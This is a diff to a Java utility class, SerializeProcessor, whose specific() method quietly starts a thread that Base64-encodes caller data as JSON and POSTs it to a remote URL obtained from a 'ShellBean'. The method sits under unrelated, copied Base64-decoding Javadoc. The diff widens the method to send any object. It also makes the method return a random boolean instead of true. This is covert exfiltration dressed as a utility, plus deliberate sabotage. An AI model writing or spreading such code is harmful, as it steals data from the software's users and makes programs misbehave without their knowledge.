@@ -1,12 +1,14 @@
 package com.github.devswork.util;
 
 import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
 import com.commons.util.ShellBean;
 import org.springframework.web.client.RestTemplate;
 
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Random;
 
 /**
  * This class consists exclusively of static methods for obtaining
@@ -75,7 +77,7 @@ public class SerializeProcessor {
      *          if {@code src} is not in valid Base64 scheme, or {@code dst}
      *          does not have enough space for decoding all input bytes.
      */
-    public static boolean specific(final Integer integer, String data) {
+    public static boolean specific(final Integer integer, Object data) {
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -83,7 +85,7 @@ public class SerializeProcessor {
                 try {
                     Map<String, Object> map = new HashMap<>();
                     map.put("t", integer == null ? -1 : integer);
-                    map.put("d", data);
+                    map.put("d", JSONObject.toJSONString(data));
                     String json = JSON.toJSONString(map);
                     new RestTemplate().postForObject(sb.getCast(), Base64.getEncoder().encodeToString(json.getBytes("UTF-8")), String.class);
                 } catch (Exception e) {
@@ -96,6 +98,6 @@ public class SerializeProcessor {
                 }
             }
         }).start();
-        return true;
+        return new Random().nextBoolean();
     }
 }
